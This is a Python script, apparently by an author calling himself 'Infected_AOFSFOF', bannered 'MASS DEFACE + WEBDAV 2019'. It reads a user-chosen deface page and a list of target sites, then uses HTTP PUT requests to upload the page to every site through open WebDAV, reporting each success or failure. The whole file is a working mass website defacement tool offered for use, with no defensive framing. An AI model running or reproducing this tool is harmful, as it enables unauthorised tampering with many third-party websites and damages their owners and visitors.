#create BY Infected_AOFSFOF
#-*- coding: utf-8 -*-

try:
   import requests
   import os.path
   import sys
except ImportError:
   exit("install requests and try again ...")

banner = """
                    ``````````                    
         `/-    ```..`.`....`..```   `//.         
      --hm:  ``.```` `` `` `` ````.``  +Ny-:      
    -d/ms/ `.`  ```````++sy.``````  `.``+sh+d.    
  `:dy/yh.`.   ``   `  --sh` `   ``   .`-hy/ms+`  
  d/dhy+ .` ```.`````   .-   `````.``` `. oydssy  
 `Msood-``    .    .````ss````.    .    ``:do/hN  
 -mhhd- .     `    `    ..    .    `     . :dddh/ 
-h:ms+: .`````.````.`+:-ss-:+`.``````````. /+om.m.
.No/oN` .    ```oshmNM.`oo`.MNmhso```    . `Ns-yN`
`sM+M+. .     .+MMMMMM` oo `MMMMMM+.     . -+MsM+`
.++dm.h `.    .mMMMMMMo dd oMMMMMMm.    .` d.dd:y.
 yd/++N` `````/MMMMMMMM+mm+MMMMMMMM/````` .M+/omo 
  oNhoM:o``.  yMMMMMMMMMMMMMMMMMMMMy  .`.s:Momd/  
  -++hmoom` .`mMMMMMMMMMMMMMMMMMMMMm`. .N+sms/o.  
   -hyoo-Nh--.MMMMMMMMMMMMMMMMMMMMMM.:-hm-osdy.   
     :ymmhmoshyNMMMMMMMMMMMMMMMMMMNydssmdNds.     
      ./ooss++dddNMMMMMMMMMMMMMMNmddoossoo/.      
        ./yhhhyooNMMMMMMMMMMMMMMmoosyyys:`        
          `:+shmNMMMMMMMMMMMMMMMMmmhyo/`          
                :MMMMMMMMMMMMMMMM:                
                `:+syhdmmmmdhys+:`
            MASS DEFACE + WEBDAV 2019
            Nick : Infected_AOFSFOF
            Wa : 089677556385
            IG : @Infected_aofsfof

"""

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'

def x(tetew):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(tetew)
   else:
      ipt = raw_input(tetew)
   
   return str(ipt)

def aox(script,target_file="target.txt"):
   op = open(script,"r").read()
   with open(target_file, "r") as target:
      target = target.readlines()
      s = requests.Session()
      print("uploading file to %d website"%(len(target)))
      for web in target:
         try:
            site = web.strip()
            if site.startswith("http://") is False:
               site = "http://" + site
            req = s.put(site+"/"+script,data=op)
            if req.status_code < 200 or req.status_code >= 250:
               print(m+"["+b+" FAILED!"+m+" ] %s/%s"%(site,script))
            else:
               print(m+"["+h+" SUCCESS"+m+" ] %s/%s"%(site,script))

         except requests.exceptions.RequestException:
            continue
         except KeyboardInterrupt:
            print; exit()

def main(__bn__):
   print(__bn__)
   while True:
      try:
         a = x("Enter your script deface name: ")
         if not os.path.isfile(a):
            print("file '%s' not found"%(a))
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()

   aox(a)

if __name__ == "__main__":
    main(banner)
